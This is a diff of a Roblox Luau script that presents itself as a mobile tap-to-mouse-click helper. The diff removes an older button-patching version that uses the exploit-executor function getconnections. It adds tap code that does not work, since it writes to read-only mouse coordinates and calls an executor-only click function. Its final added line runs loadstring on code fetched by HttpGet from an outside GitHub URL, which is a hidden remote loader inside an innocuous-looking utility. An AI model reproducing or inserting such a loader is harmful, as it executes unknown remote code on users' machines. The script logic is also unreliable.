@@ -1,40 +1,36 @@
--- StarterPlayerScripts / TouchAsClick.global.lua
+-- Mobile Tap to Mouse Click Script (Luau - Roblox)
+-- Place this in StarterPlayer > StarterPlayerScripts (LocalScript)
+
 local Players = game:GetService("Players")
-local UIS = game:GetService("UserInputService")
+local UserInputService = game:GetService("UserInputService")
+local ContextActionService = game:GetService("ContextActionService")
+
 local player = Players.LocalPlayer
-local pg = player:WaitForChild("PlayerGui")
 
-local function PatchButton(btn)
-	if btn:GetAttribute("TouchPatched") then return end
-	btn:SetAttribute("TouchPatched", true)
+-- Wait for the player's mouse (works on both PC and mobile)
+local mouse = player:GetMouse()
 
-	-- Fire the button's MouseButton1Click when touched
-	btn.InputEnded:Connect(function(input)
-		if input.UserInputType == Enum.UserInputType.Touch then
-			for _, conn in ipairs(getconnections(btn.MouseButton1Click)) do
-				conn:Fire()
-			end
+-- Only run on touch devices (optional, but prevents double-inputs on PC)
+if UserInputService.TouchEnabled then
+	local function onTap(positionTable, gameProcessedEvent)
+		-- Ignore if the tap was on a GUI element that already handled it
+		if gameProcessedEvent then
+			return
 		end
-	end)
+
+		-- Get the position of the tap
+		local tapPosition = positionTable[1]  -- First touch position
+
+		-- Move the virtual mouse to the tap position
+		mouse.X = tapPosition.X
+		mouse.Y = tapPosition.Y
+
+		-- Simulate a left mouse button click
+		mouse1Click()
+	end
+
+	-- Bind the touch tap event
+	UserInputService.TouchTap:Connect(onTap)
 end
 
-local function Scan(obj)
-	if obj:IsA("GuiButton") then
-		PatchButton(obj)
-	end
-	for _, child in ipairs(obj:GetChildren()) do
-		Scan(child)
-	end
-end
-
--- Initial scan
-pg.DescendantAdded:Connect(function(d)
-	if d:IsA("GuiButton") then
-		PatchButton(d)
-	end
-end)
-
--- Scan any Guis that appear later
-for _, s in ipairs(pg:GetChildren()) do
-	Scan(s)
-end
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/azureblueday/astrahub/refs/heads/main/astra59.luau')))()
